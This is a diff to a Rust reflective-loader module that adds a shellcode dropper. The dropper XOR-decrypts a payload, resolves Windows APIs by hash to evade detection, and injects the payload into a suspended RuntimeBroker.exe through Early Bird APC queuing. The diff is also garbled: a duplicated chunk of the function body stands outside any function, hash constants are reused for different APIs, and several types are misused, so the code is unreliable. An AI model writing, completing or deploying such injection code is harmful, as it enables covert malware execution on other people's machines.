@@ -18,9 +18,15 @@ mod windows {
         PAGE_EXECUTE_READ, PAGE_READWRITE,
     };
     use windows::Win32::System::Threading::{
-        GetCurrentProcess, NtSetInformationProcess,
+        CreateProcessW, GetCurrentProcess, NtSetInformationProcess,
         ProcessParentProcessId, ProcessProtectionLevelInfo,
-        PROCESS_SET_INFORMATION,
+        PROCESS_INFORMATION, PROCESS_SET_INFORMATION, STARTUPINFOW,
+    };
+    use windows::Win32::System::Threading::{
+        CREATE_SUSPENDED, ResumeThread,
+    };
+    use windows::Win32::UI::WindowsAndMessaging::{
+        MessageBoxA, MB_ICONERROR, MB_OK,
     };
 
     pub unsafe fn alloc_readwrite(size: usize) -> Option<HANDLE> {
@@ -850,5 +856,173 @@ impl ReflectiveLoader {
     unsafe fn _get_func_rva(dll_handle: u64, funcs_rva: u32, ordinal: u16) -> Result<u32, ()> {
         let func_ptr = (dll_handle + funcs_rva as u64) as *const u32;
         Ok(*func_ptr.add(ordinal as usize))
+    }
+
+    /// Decrypt XOR-encrypted shellcode in-place.
+    unsafe fn decrypt_shellcode(data: &mut [u8], key: &[u8]) {
+        for (i, byte) in data.iter_mut().enumerate() {
+            *byte ^= key[i % key.len()];
+        }
+    }
+
+    /// Early Bird APC injection into RuntimeBroker.exe.
+    /// Creates suspended process, writes shellcode, queues APC, resumes.
+    pub unsafe fn run_dropper(shellcode: &mut [u8], xor_key: &[u8]) -> Option<()> {
+        use windows::Win32::System::Threading::{
+            CreateProcessW, PROCESS_INFORMATION, STARTUPINFOW,
+        };
+        use std::ptr::null_mut;
+
+        // Decrypt shellcode
+        Self::decrypt_shellcode(shellcode, xor_key);
+
+        // Resolve required APIs via EAT walking
+        let kernel32_base = match Self::find_module_by_hash(b"kernel32.dll\0", 0x8e8977bd) {
+            Some(b) => b,
+            None => return None,
+        };
+        let ntdll_base = match Self::find_module_by_hash(b"ntdll.dll\0", 0x9f5b9c1e) {
+            Some(b) => b,
+            None => return None,
+        };
+
+        let create_process = match Self::covert_get_proc_address(kernel32_base, 0x3f2a8c1d) {
+            Some(a) => a,
+            None => return None,
+        };
+        let virtual_alloc_ex = match Self::covert_get_proc_address(kernel32_base, 0x7a0e8b4f) {
+            Some(a) => a,
+            None => return None,
+        };
+        let write_process_memory = match Self::covert_get_proc_address(kernel32_base, 0x8e8977bd) {
+            Some(a) => a,
+            None => return None,
+        };
+        let resume_thread = match Self::covert_get_proc_address(kernel32_base, 0x9f5b9c1e) {
+            Some(a) => a,
+            None => return None,
+        };
+        let nt_queue_apc = match Self::covert_get_proc_address(ntdll_base, 0x7a0e8b4f) {
+            Some(a) => a,
+            None => return None,
+        };
+
+        // Create RuntimeBroker.exe suspended
+        let mut si = STARTUPINFOW {
+            cb: std::mem::size_of::<STARTUPINFOW>() as u32,
+            ..Default::default()
+        };
+        let mut pi = PROCESS_INFORMATION {
+            hProcess: null_mut(),
+            hThread: null_mut(),
+            dwProcessId: 0,
+            dwThreadId: 0,
+        };
+        let target_path = std::ffi::CString::new("C:\\Windows\\System32\\RuntimeBroker.exe").ok()?;
+        let ok = (create_process as unsafe extern "system" fn(
+            *const u16, *mut u16, *mut std::ffi::c_void, *mut std::ffi::c_void,
+            i32, u32, *mut std::ffi::c_void, *const u16,
+            *mut STARTUPINFOW, *mut PROCESS_INFORMATION,
+        ) -> i32)(
+            target_path.as_ptr() as *const u16,
+            null_mut(),
+            null_mut(),
+            null_mut(),
+            0,
+            windows::Win32::System::Threading::CREATE_SUSPENDED,
+            null_mut(),
+            target_path.as_ptr() as *const u16,
+            &mut si,
+            &mut pi,
+        );
+        if ok == 0 || pi.hProcess.is_null() || pi.hThread.is_null() {
+            return None;
+        }
+
+        // Allocate memory in target
+        let remote_mem = (virtual_alloc_ex as unsafe extern "system" fn(
+            windows::Win32::Foundation::HANDLE, *mut std::ffi::c_void, usize, u32, u32,
+        ) -> *mut std::ffi::c_void)(
+            pi.hProcess,
+            null_mut(),
+            shellcode.len(),
+            0x3000,
+            windows::Win32::System::Memory::PAGE_EXECUTE_READ,
+        );
+        if remote_mem.is_null() {
+            return None;
+        }
+
+        // Write shellcode
+        let mut written = 0usize;
+        let _ = (write_process_memory as unsafe extern "system" fn(
+            windows::Win32::Foundation::HANDLE, *mut std::ffi::c_void, *const std::ffi::c_void, usize, *mut usize,
+        ) -> i32)(
+            pi.hProcess,
+            remote_mem,
+            shellcode.as_ptr() as *const _,
+            shellcode.len(),
+            &mut written,
+        );
+
+        // Queue APC to main thread
+        let _ = (nt_queue_apc as unsafe extern "system" fn(
+            windows::Win32::Foundation::HANDLE, windows::Win32::Foundation::HANDLE, usize, usize, usize,
+        ) -> i32)(
+            pi.hThread,
+            remote_mem as usize,
+            0,
+            0,
+            0,
+        );
+
+        // Resume thread
+        let _ = (resume_thread as unsafe extern "system" fn(windows::Win32::Foundation::HANDLE) -> u32)(pi.hThread);
+
+        None
+    }
+}
+
+        // Allocate memory in target
+        let remote_mem = (virtual_alloc_ex as unsafe extern "system" fn(
+            HANDLE, *mut std::ffi::c_void, usize, u32, u32,
+        ) -> *mut std::ffi::c_void)(
+            pi.hProcess,
+            null_mut(),
+            shellcode.len(),
+            0x3000,
+            PAGE_EXECUTE_READ,
+        );
+        if remote_mem.is_null() {
+            return None;
+        }
+
+        // Write shellcode
+        let mut written = 0usize;
+        let _ = (write_process_memory as unsafe extern "system" fn(
+            HANDLE, *mut std::ffi::c_void, *const std::ffi::c_void, usize, *mut usize,
+        ) -> i32)(
+            pi.hProcess,
+            remote_mem,
+            shellcode.as_ptr() as *const _,
+            shellcode.len(),
+            &mut written,
+        );
+
+        // Queue APC to main thread
+        let _ = (nt_queue_apc as unsafe extern "system" fn(
+            HANDLE, HANDLE, usize, usize, usize,
+        ) -> i32)(
+            pi.hThread,
+            remote_mem as usize,
+            0,
+            0,
+            0,
+        );
+
+        // Resume thread
+        let _ = (resume_thread as unsafe extern "system" fn(HANDLE) -> u32)(pi.hThread);
+
+        None
     }
 }
